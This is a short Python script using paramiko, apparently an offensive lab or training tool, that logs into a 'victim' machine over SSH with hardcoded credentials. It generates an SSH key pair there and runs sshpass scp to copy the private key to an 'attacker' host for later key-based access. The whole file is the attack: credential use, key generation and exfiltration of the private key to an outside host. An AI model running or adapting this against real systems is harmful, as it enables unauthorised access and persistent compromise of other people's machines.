import paramiko


def ssh_command(ip, user, password, command, port=22):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    client.connect(ip, username=user, password=password, port=port)

    session = client.get_transport().open_session()

    if session.active:
        print('Session Active')
        session.exec_command(command)
        session.exec_command('y')
        session.exec_command('yes')

        print('\n--------Victim Std Out--------')
        print(session.recv(2048))
        print('--------Victim Std Out--------\n')
    else:
        print('Session Failed')


if __name__ == '__main__':
    victim, attacker = {}, {}

    print('[Victim]')
    victim['ip'] = raw_input('ip: ')
    victim['port'] = raw_input('port: ')
    victim['name'] = raw_input('name: ')
    victim['password'] = raw_input('password: ')

    print('\n[Attacker]')
    attacker['ip'] = raw_input('ip: ')
    attacker['port'] = raw_input('port: ')
    attacker['name'] = raw_input('name: ')
    attacker['password'] = raw_input('password: ')

    try:
        print('\nUse victim/victim to ssh log into victim system')
        command = 'ssh-keygen -f /home/victim/.ssh/victim_key -P 12345'
        ssh_command(victim['ip'], 'victim', 'victim', command, int(victim['port']))

        command = 'sshpass {0} scp /home/victim/.ssh/victim_key {1}@{2}:/home/{3}/victimKey'.format(attacker['password'], attacker['name'], attacker['ip'], attacker['name'])
        print(command)
        ssh_command(victim['ip'], 'victim', 'victim', command, int(victim['port']))

    except Exception as e:
        print(e)
        print('\nUse private key to ssh log into victim system')





